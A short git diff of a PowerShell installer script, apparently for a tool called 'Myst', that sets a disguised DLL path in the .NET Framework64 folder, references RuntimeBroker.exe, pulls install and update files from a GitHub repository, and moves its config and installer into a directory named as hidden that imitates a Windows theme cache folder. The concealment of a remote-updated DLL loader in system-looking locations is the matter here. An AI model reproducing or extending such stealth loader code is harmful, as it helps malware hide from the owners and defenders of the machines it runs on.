@@ -17,10 +17,11 @@ $framework64 = "$env:SystemRoot\Microsoft.NET\Framework64"
 $p = "$framework64\sbscmp64_mscorwks.dll"
 $defaultScriptUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/install.ps1'
 $defaultUpdateManifestUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/update.json'
-$script:UpdateManifestPath = Join-Path $env:ProgramData 'Myst\update.json'
+$script:HiddenConfigDir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Themes\CachedFiles'
+$script:UpdateManifestPath = Join-Path $script:HiddenConfigDir 'update.json'
 $n = 'RuntimeBroker'
 $x = "$env:SystemRoot\System32\$n.exe"
-$script:DllExecuterInstallPath = Join-Path $env:ProgramData 'Myst\install.ps1'
+$script:DllExecuterInstallPath = Join-Path $script:HiddenConfigDir 'install.ps1'
 
 function Write-Step {
     param([string]$Message, [string]$Color = 'Cyan')
